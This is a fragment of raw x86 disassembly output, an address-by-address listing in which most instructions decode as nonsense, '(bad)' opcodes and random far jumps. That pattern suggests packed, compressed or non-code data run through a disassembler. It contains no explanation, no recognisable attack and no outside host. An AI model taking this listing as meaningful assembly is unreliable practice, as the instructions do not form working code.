  42fa6d:	jnp    0x42fae2
  42fa6f:	adc    al,0x57
  42fa71:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa73:	cmp    al,0x0
  42fa75:	mov    ds,WORD PTR [si+0x20]
  42fa79:	loope  0x42fa01
  42fa7b:	or     dh,BYTE PTR [esi]
  42fa7d:	ja     0x42fa4c
  42fa7f:	rol    DWORD PTR es:[edi],0x1f
  42fa83:	out    dx,al
  42fa84:	sbb    bl,ch
  42fa86:	and    al,0xf
  42fa88:	jns    0x42fae3
  42fa8a:	inc    edx
  42fa8b:	repnz push eax
  42fa8d:	inc    ecx
  42fa8e:	out    dx,al
  42fa8f:	or     ebx,esi
  42fa91:	and    ecx,DWORD PTR [edx+0x7931fe49]
  42fa97:	or     BYTE PTR [edx],dh
  42fa99:	ins    BYTE PTR es:[edi],dx
  42fa9a:	mov    eax,ds:0xb72ceaf8
  42fa9f:	dec    ebp
  42faa0:	aam    0xd5
  42faa2:	cld    
  42faa3:	mov    BYTE PTR [esp+ebp*2+0x119f7969],bh
  42faaa:	fwait
  42faab:	add    dh,dh
  42faad:	push   esi
  42faae:	pushw  0xe730
  42fab2:	xchg   BYTE PTR [edx+0x6244ec6b],bl
  42fab8:	aad    0x46
  42faba:	mov    cl,0x31
  42fabc:	and    BYTE PTR [esi],ah
  42fabe:	cs popa 
  42fac0:	xchg   ebp,eax
  42fac1:	sub    dh,dl
  42fac3:	jmp    0x456c:0x36d24a9d
  42faca:	jge    0x42fb0a
  42facc:	(bad)  
  42facd:	and    bh,BYTE PTR [edx]
  42facf:	sub    BYTE PTR [esi],ch
  42fad1:	data16 and cl,bl
  42fad4:	sbb    edx,DWORD PTR [ebx+0x32]
  42fad7:	and    ebp,DWORD PTR [ebp+0x2e]
  42fada:	bound  ebx,QWORD PTR [esi]
  42fadc:	ja     0x42faf4
  42fade:	mov    ebx,ebx
  42fae0:	rcl    DWORD PTR [ebx+0x5c],0xf5
  42fae4:	cmp    al,0x93
  42fae6:	adc    al,0xcf
  42fae8:	sub    al,0x68
  42faea:	or     dl,al
  42faec:	das    
  42faed:	sahf   
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	imul   edi,DWORD PTR [eax],0xff6707ce
  42fb68:	add    DWORD PTR [eax],eax
  42fb6a:	add    BYTE PTR [ecx],al
  42fb6c:	add    BYTE PTR [eax],al
  42fb6e:	add    eax,0x565fdeda
  42fb73:	mov    bl,0x35
  42fb75:	and    eax,0x2634622b
  42fb7a:	push   esp
  42fb7b:	bswap  eax
  42fb7d:	test   eax,0x1ed6409c
  42fb82:	dec    ebp
  42fb83:	ret    0x987c
  42fb86:	fstp   DWORD PTR [eax]
  42fb88:	sbb    edx,eax
  42fb8a:	push   ecx
  42fb8b:	test   eax,0x5f3f71a4
  42fb90:	stos   DWORD PTR es:[edi],eax
  42fb91:	fisubr DWORD PTR [esi]
  42fb93:	dec    esi
  42fb94:	pop    ss
  42fb95:	mov    ch,0x4c
  42fb97:	sbb    ah,BYTE PTR [ecx]
  42fb99:	xchg   ecx,eax
  42fb9a:	mov    edx,0xb1c72afc
  42fb9f:	in     al,dx
  42fba0:	retf   0x8689
  42fba3:	jecxz  0x42fb52
  42fba5:	stos   BYTE PTR es:[edi],al
  42fba6:	sub    esp,ecx
  42fba8:	jno    0x42fb77
  42fbaa:	or     BYTE PTR [edx+edx*4+0x53bcd344],0xd6
  42fbb2:	aas    
  42fbb3:	adc    bh,BYTE PTR [esi+0x43d18945]
  42fbb9:	es cwde 
  42fbbb:	sbb    eax,0xe2e7968a
  42fbc0:	imul   edx,DWORD PTR [esi-0x2f],0xffffffd4
  42fbc4:	cmp    esi,DWORD PTR [esi-0x51]
  42fbc7:	xchg   ecx,eax
  42fbc8:	sbb    al,0xfd
  42fbca:	add    bh,ah
  42fbcc:	fisub  DWORD PTR [edx+eiz*8+0x46]
  42fbd0:	cli    
  42fbd1:	dec    esi
  42fbd2:	cmp    ebx,DWORD PTR ds:0xde2dd455
  42fbd8:	and    BYTE PTR [eax+0x4f],ch
  42fbdb:	scas   eax,DWORD PTR es:[edi]
  42fbdc:	cmc    
  42fbdd:	int3   
  42fbde:	sub    eax,0x6d1c8ae5
  42fbe3:	cs mov esp,ss
  42fbe6:	pop    edi
  42fbe7:	jmp    0x42fbae
  42fbe9:	push   0x32
  42fbeb:	adc    ch,ch
  42fbed:	cwde   
  42fbee:	fstp   DWORD PTR [edi-0x7e]
  42fbf1:	mov    esp,0x632d21a9
  42fbf6:	aad    0x13
  42fbf8:	cld    
  42fbf9:	pop    eax
  42fbfa:	sbb    edi,DWORD PTR [edi+0x1b]
  42fbfd:	mov    ebp,0x711cab05
  42fc02:	and    al,BYTE PTR [eax+ebp*2+0x6c9186f9]
  42fc09:	push   esi
  42fc0a:	repnz xchg edx,eax
  42fc0c:	push   0xffffffac
  42fc0e:	mov    DWORD PTR ds:0x9f5f69da,esp
  42fc14:	mov    al,ds:0x8c24089d
  42fc19:	leave  
  42fc1a:	(bad)  
  42fc1b:	div    DWORD PTR [eax+0x2]
  42fc1e:	jnp    0x42fc42
  42fc20:	adc    DWORD PTR [edx-0x667d391],ebp
  42fc26:	shr    BYTE PTR [esi+ebp*2-0x414ce5cd],0xed
  42fc2e:	push   ecx
  42fc2f:	je     0x42fc96
  42fc31:	or     bh,BYTE PTR [ecx-0x25]
  42fc34:	xchg   ebp,eax
  42fc35:	push   ss
  42fc36:	stc    
  42fc37:	stos   DWORD PTR es:[edi],eax
  42fc38:	sti    
  42fc39:	stos   DWORD PTR es:[edi],eax
  42fc3a:	jns    0x42fca7
  42fc3c:	xchg   BYTE PTR [ebp+0x21],dl
  42fc3f:	hlt    
  42fc40:	je     0x42fbde
  42fc42:	outs   dx,BYTE PTR ds:[esi]
  42fc43:	pusha  
  42fc44:	fnsave [esi]
  42fc46:	push   esi
  42fc47:	lahf   
  42fc48:	std    
  42fc49:	mov    ds:0x9aa44462,eax
  42fc4e:	hlt    
  42fc4f:	dec    edx
  42fc50:	pusha  
  42fc51:	cmp    DWORD PTR [eax+0xdcd7405],esp
  42fc57:	in     al,dx
  42fc58:	mov    edx,ebx
  42fc5a:	sub    dl,dl
  42fc5c:	sbb    eax,DWORD PTR [eax-0x19]
  42fc5f:	sti    
  42fc60:	in     eax,0x12
  42fc62:	gs aad 0x37
  42fc65:	and    esp,0xfe9104f9
  42fc6b:	dec    edi
  42fc6c:	pop    eax
  42fc6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [edx-0x51],ch
  42fce4:	inc    edi
  42fce5:	adc    esp,DWORD PTR [edi+0x0]
  42fce8:	add    al,BYTE PTR [eax]
  42fcea:	add    BYTE PTR [ecx],al
  42fcec:	add    BYTE PTR [eax],al
  42fcee:	js     0x42fcdc
  42fcf0:	dec    ecx
  42fcf1:	mov    cl,0x7e
  42fcf3:	div    ch
  42fcf5:	sbb    bl,BYTE PTR [ebx+0x72]
  42fcf8:	test   eax,0xb3f0ca72
  42fcfd:	add    eax,0xea75f4fc
  42fd02:	bound  ecx,QWORD PTR [ebp-0x7f]
  42fd05:	mov    cl,0xe1
  42fd07:	(bad)  
  42fd08:	imul   ebx,DWORD PTR [ecx+0x586b5184],0xffffffa4
  42fd0f:	fld    QWORD PTR [esi]
  42fd11:	push   ebx
  42fd12:	and    al,0x75
  42fd14:	jo     0x42fd76
  42fd16:	adc    BYTE PTR [edx],dl
  42fd18:	icebp  
  42fd19:	push   0x0
  42fd1b:	push   edx
  42fd1c:	inc    edx
  42fd1d:	arpl   di,sp
  42fd1f:	bound  ecx,QWORD PTR [eax-0x74175d62]
  42fd25:	or     ebx,DWORD PTR [eax+0x24]
  42fd28:	out    dx,al
  42fd29:	jl     0x42fce2
  42fd2b:	add    bl,BYTE PTR [eax]
  42fd2d:	lods   al,BYTE PTR ds:[esi]
  42fd2e:	mov    eax,ds:0xdb9607df
  42fd33:	pop    edi
  42fd34:	mov    BYTE PTR [ebp+0x78],dh
  42fd37:	xchg   ebp,eax
  42fd38:	or     eax,0x65fe5b24
  42fd3d:	pop    ebx
  42fd3e:	sub    BYTE PTR [ebx-0x394cfb95],bh
  42fd44:	stc    
  42fd45:	adc    ecx,DWORD PTR [edx-0x42]
  42fd48:	xor    DWORD PTR [edx+eax*2+0x1edaaafe],eax
  42fd4f:	imul   esi,DWORD PTR fs:[eax+0x66],0x2f9de736
  42fd57:	jp     0x42fd0c
  42fd59:	jmp    0x5bd5:0xb6e1353f
  42fd60:	or     eax,edx
  42fd62:	repz fld DWORD PTR [ecx+edx*1+0x3f]
  42fd67:	repz bts edi,eax
  42fd6b:	or     eax,DWORD PTR [edi+0x4a5ce8e1]
  42fd71:	adc    bl,BYTE PTR [ebp-0x290af52c]
  42fd77:	ja     0x42fd3b
  42fd79:	fimul  WORD PTR [edx+0x38601d89]
  42fd7f:	and    al,0x8b
  42fd81:	jno    0x42fdc4
  42fd83:	jns    0x42fd74
  42fd85:	or     ch,BYTE PTR [ecx]
  42fd87:	mov    BYTE PTR [edx+0x8],bh
  42fd8a:	or     ecx,DWORD PTR [ebx-0x86e7f2]
  42fd90:	or     al,0xdc
  42fd92:	dec    esi
  42fd93:	out    dx,al
  42fd94:	inc    ebx
  42fd95:	les    eax,FWORD PTR [edx-0x3d]
  42fd98:	lods   eax,DWORD PTR ds:[esi]
  42fd99:	or     BYTE PTR [edi+0x22a3872e],dh
  42fd9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fda0:	cmp    ecx,DWORD PTR [esp+edx*2]
  42fda3:	xchg   edi,eax
  42fda4:	xchg   edx,eax
  42fda5:	jp     0x42fda5
  42fda7:	and    BYTE PTR [esi],ah
  42fda9:	inc    edx
  42fdaa:	xor    eax,0x51e12470
  42fdaf:	mov    ds:0x814a639d,al
  42fdb4:	mov    eax,ds:0xf2de01c7
  42fdb9:	sti    
  42fdba:	mov    eax,0x831b6615
  42fdbf:	dec    edx
  42fdc0:	fsubr  DWORD PTR [ecx]
  42fdc2:	jmp    0x42fddd
  42fdc4:	out    dx,al
  42fdc5:	cmp    cl,bh
  42fdc7:	push   esp
  42fdc8:	cmc    
  42fdc9:	adc    ch,ah
  42fdcb:	call   0x6b35:0xce97c5d8
  42fdd2:	jl     0x42fe1f
  42fdd4:	in     eax,0xc5
  42fdd6:	paddusb mm5,mm6
  42fdd9:	mov    ch,0xc8
  42fddb:	mov    bl,0x5f
  42fddd:	xor    bl,ah
  42fddf:	push   esi
  42fde0:	fs xchg edx,eax
  42fde2:	aas    
  42fde3:	das    
  42fde4:	cmp    al,0x78
  42fde6:	lods   al,BYTE PTR ds:[esi]
  42fde7:	jp     0x42fdb8
  42fde9:	xchg   edi,eax
  42fdea:	pop    ecx
  42fdeb:	ins    DWORD PTR es:[edi],dx
  42fdec:	loopne 0x42fdd4
	...
  42fe56:	dec    eax
  42fe57:	rol    dl,0xf0
  42fe5a:	retf   0x7af2
  42fe5d:	clc    
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz xchg ebx,eax
  42fe63:	pop    ds
  42fe64:	stos   BYTE PTR es:[edi],al
  42fe65:	xor    ah,BYTE PTR [edi+0x1]
  42fe68:	add    al,BYTE PTR [eax]
  42fe6a:	add    BYTE PTR [ecx],al
  42fe6c:	add    BYTE PTR [eax],al
  42fe6e:	ins    DWORD PTR es:[edi],dx
  42fe6f:	cmc    
  42fe70:	retf   0xc69c
  42fe73:	adc    DWORD PTR [edx+0x5],ebp
  42fe76:	(bad)  
  42fe77:	fbld   TBYTE PTR [eax-0x13c98957]
  42fe7d:	xchg   ecx,eax
  42fe7e:	outs   dx,BYTE PTR ds:[esi]
  42fe7f:	fist   WORD PTR ds:0x4906c467
  42fe85:	es leave 
  42fe87:	xchg   ecx,eax
  42fe88:	in     eax,0x26
  42fe8a:	adc    al,BYTE PTR gs:[ecx]
  42fe8d:	ror    DWORD PTR [edi],1
  42fe8f:	shl    DWORD PTR [ebx+0x4e],cl
  42fe92:	jbe    0x42fe84
  42fe94:	mov    eax,ds:0x6990cd2f
  42fe99:	inc    esp
  42fe9a:	mov    bl,0xcc
  42fe9c:	mov    cl,0xf1
  42fe9e:	bound  ebx,QWORD PTR [edx]
  42fea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fea1:	or     ebx,esp
  42fea3:	inc    edx
  42fea4:	or     edi,DWORD PTR [esi+0x11879706]
  42feaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42feab:	and    edi,DWORD PTR [edi]
  42fead:	hlt    
  42feae:	dec    ecx
  42feaf:	js     0x42fe72
  42feb1:	jnp    0x42feab
  42feb3:	pop    ds
  42feb4:	and    al,0xea
  42feb6:	mov    eax,ds:0x821a17be
  42febb:	in     al,0x26
  42febd:	jmp    0x25a513ec
  42fec2:	inc    ebx
  42fec3:	loope  0x42feba
  42fec5:	loop   0x42fe9d
  42fec7:	push   ds
  42fec8:	das    
  42fec9:	scas   al,BYTE PTR es:[edi]
  42feca:	hlt    
  42fecb:	pop    ecx
  42fecc:	cmp    dh,BYTE PTR [ecx+0x7d]
  42fecf:	sar    BYTE PTR [ebp-0x5b],1
  42fed2:	push   ss
  42fed3:	xchg   ebx,eax
  42fed4:	stc    
  42fed5:	repz sub DWORD PTR [edx-0x1a880b29],eax
  42fedc:	mov    ds:0x2a5c2467,al
  42fee1:	cmp    DWORD PTR [eax],0xffffff8c
  42fee4:	pop    es
  42fee5:	jg     0x42fe7c
  42fee7:	push   ebx
  42fee8:	aas    
  42fee9:	call   0x39fbd21b
  42feee:	xchg   BYTE PTR [eax],cl
  42fef0:	retf   
  42fef1:	cdq    
  42fef2:	bound  ebp,QWORD PTR [edi-0x42]
  42fef5:	xor    DWORD PTR [edi],ebp
  42fef7:	js     0x42feb3
  42fef9:	add    DWORD PTR [eax],ebp
  42fefb:	mov    esi,0xd6e2fb7f
  42ff00:	push   ss
  42ff01:	retf   0xb1ca
  42ff04:	ficomp WORD PTR [edi-0x29]
  42ff07:	ret    
  42ff08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff09:	cs in  al,0x46
  42ff0c:	xchg   edx,eax
  42ff0d:	ret    
  42ff0e:	mov    dl,0x47
  42ff10:	pusha  
  42ff11:	mov    bh,0xb0
  42ff13:	xchg   DWORD PTR [ecx-0x38],ebp
  42ff16:	rcl    DWORD PTR [esi],1
  42ff18:	pop    ss
  42ff19:	(bad)  
  42ff1a:	jmp    0x22d3:0x48b44d4a
  42ff21:	adc    BYTE PTR [ebx+0x3a],ch
  42ff24:	push   ecx
  42ff25:	mov    bl,0x5d
  42ff27:	jmp    0x6441e86b
  42ff2c:	jae    0x42ff1b
  42ff2e:	adc    dl,BYTE PTR [ecx+0x24]
  42ff31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff32:	mov    DWORD PTR [ebp+0x733515dd],0xa32d9bfd
  42ff3c:	adc    eax,0xab4fe1a0
  42ff41:	inc    edi
  42ff42:	pop    esi
  42ff43:	and    bh,BYTE PTR [eax-0x72be6f67]
  42ff49:	sbb    DWORD PTR [ecx+0x52],0xfab875c8
  42ff50:	xchg   esi,eax
  42ff51:	mov    eax,ds:0x6b1ab665
  42ff56:	cld    
  42ff57:	or     BYTE PTR [ebx],0x47
  42ff5a:	(bad)  
  42ff5b:	cmovge ecx,DWORD PTR [ecx]
  42ff5e:	cdq    
  42ff5f:	dec    ebx
  42ff60:	mov    bh,0x24
  42ff62:	and    eax,0x3d181ce6
  42ff67:	xchg   ebp,eax
  42ff68:	out    dx,eax
  42ff69:	pop    eax
  42ff6a:	cmc    
  42ff6b:	jb     0x42ff49
  42ff6d:	push   0x0
	...
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [eax+eax*2+0x31],0x66
  42ffe5:	xlat   BYTE PTR ds:[ebx]
  42ffe6:	add    al,BYTE PTR [bp+si]
  42ffe9:	add    BYTE PTR [eax],al
  42ffeb:	add    DWORD PTR [eax],eax
  42ffed:	add    BYTE PTR [ebp+0x436dda30],cl
  42fff3:	xchg   ecx,eax
  42fff4:	mov    ds:0xf7e67820,al
  42fff9:	dec    ebp
  42fffa:	jb     0x43003c
  42fffc:	sub    DWORD PTR [edi],0x5d6f872
  430002:	mov    ecx,0xf600c78c
  430007:	mov    dl,0x96
  430009:	(bad)  
  43000a:	or     BYTE PTR [esi+0x23],bl
  43000d:	inc    ecx
  43000e:	stos   DWORD PTR es:[edi],eax
  43000f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430010:	ja     0x43006b
  430012:	(bad)  
  430013:	(bad)  
  430014:	inc    ebp
  430015:	int3   
  430016:	das    
  430017:	push   ecx
  430018:	ds cwde 
  43001a:	cmp    al,0xcd
  43001c:	les    ebp,FWORD PTR [ebp+0x6368cebe]
  430022:	das    
  430023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430024:	into   
  430025:	xchg   edx,eax
  430026:	adc    eax,eax
  430028:	or     BYTE PTR [edi-0x57508806],bh
  43002e:	mov    dl,0x2b
  430030:	push   edx
  430031:	jb     0x42ffc4
  430033:	idiv   BYTE PTR [ebp+0x6fe350b6]
  430039:	adc    al,0x87
  43003b:	jmp    0x43007a
  43003d:	push   eax
  43003e:	cmp    BYTE PTR [esi+eiz*1+0x5c153f7a],al
  430045:	xor    ch,bh
  430047:	xchg   BYTE PTR [edx],ah
  430049:	xchg   BYTE PTR [ebp+0x49297917],al
  43004f:	aam    0x17
  430051:	imul   edi,DWORD PTR ds:0xdd7b79ee,0xf890e61b
  43005b:	mov    eax,ds:0x32885418
  430060:	dec    edx
  430061:	shr    DWORD PTR [ecx+0x1e8681b],cl
  430067:	lds    ebp,FWORD PTR [ebx+0x32]
  43006a:	test   eax,ebp
  43006c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43006d:	push   es
  43006e:	jle    0x43004e
  430070:	das    
  430071:	push   0x50
  430073:	pusha  
  430074:	das    
  430075:	out    dx,al
  430076:	scas   al,BYTE PTR es:[edi]
  430077:	mov    WORD PTR [ebp-0x136ad20b],ds
  43007d:	push   ds
  43007e:	cmp    DWORD PTR [esi+0x12],eax
  430081:	mov    cl,0x91
  430083:	xchg   DWORD PTR [edi+0x3b8a6498],esi
  430089:	jmp    0xde1a:0xa8d97515
  430090:	push   esi
  430091:	xor    BYTE PTR [edx+0x2ae67ec8],ah
  430097:	sbb    eax,0xe60f88b2
  43009c:	mov    ecx,0xdb1be395
  4300a1:	in     eax,dx
  4300a2:	and    edx,esi
  4300a4:	push   ss
  4300a5:	popf   
  4300a6:	pushf  
  4300a7:	popf   
  4300a8:	cmp    dl,BYTE PTR [esi-0x34]
  4300ab:	mov    ds:0x4911bd92,eax
  4300b0:	xor    DWORD PTR [ebx-0x7d],0xffffffb5
  4300b4:	cmp    DWORD PTR [edx],ebp
  4300b6:	mov    ah,0xa8
  4300b8:	pop    eax
  4300b9:	repnz mov cl,0xd5
  4300bc:	fldenv [edi]
  4300be:	xor    eax,0xabfff55c
  4300c3:	cs sub edx,ebx
  4300c6:	add    ebx,DWORD PTR [ebp+eiz*8+0x25]
  4300ca:	xor    edx,edi
  4300cc:	pusha  
  4300cd:	mov    DWORD PTR [esi-0x50aa5e83],esp
  4300d3:	mov    dl,0x76
  4300d5:	js     0x43009f
  4300d7:	jne    0x4300fe
  4300d9:	jbe    0x430128
  4300db:	dec    esi
  4300dc:	and    esp,ebx
  4300de:	mov    al,0x4
  4300e0:	mov    edx,0x29747c37
  4300e5:	mov    edi,0x59dfb81a
  4300ea:	pop    esp
  4300eb:	retf   
  4300ec:	ds and eax,0x0
	...
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0x56
  430163:	inc    esi
  430164:	sar    BYTE PTR [esi+0x20367],cl
  43016a:	push   esp
  43016b:	add    BYTE PTR [eax],al
  43016d:	add    BYTE PTR [ebx],dh
  43016f:	xor    eax,0x231063e4
  430174:	and    dl,bh
  430176:	dec    ebx
  430177:	push   esi
  430178:	scas   al,BYTE PTR es:[edi]
  430179:	imul   ecx,DWORD PTR [esi+0xa6cf2a1],0xb027bb64
  430183:	push   ds
  430184:	adc    eax,DWORD PTR [edi]
  430186:	imul   ebp,DWORD PTR [esp+eiz*8-0x77ba27ae],0x66
  43018e:	xor    eax,edx
  430190:	iret   
  430191:	rcl    BYTE PTR [eax],1
  430193:	fbstp  TBYTE PTR [ebp+0x7d1160b2]
  430199:	dec    ebx
  43019a:	push   eax
  43019b:	xchg   edx,eax
  43019c:	mov    ch,ah
  43019e:	mov    bh,0xf5
  4301a0:	in     eax,dx
  4301a1:	adc    eax,0xcc89d61d
  4301a6:	(bad)  
  4301a7:	and    BYTE PTR [edi+ebp*4-0x4a],dh
  4301ab:	cli    
  4301ac:	dec    ebp
  4301ad:	and    DWORD PTR [eax-0x43],esp
  4301b0:	xor    al,0xa
  4301b2:	adc    al,0xbf
  4301b4:	pop    ds
  4301b5:	scas   al,BYTE PTR es:[edi]
  4301b6:	push   ds
  4301b7:	not    BYTE PTR [ebx-0x7bd87f31]
  4301bd:	pop    ds
  4301be:	neg    DWORD PTR [esi+0x1a4b]
	...
  4301d4:	add    BYTE PTR [eax],al
  4301d6:	dec    ebp
  4301d7:	push   ebp
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
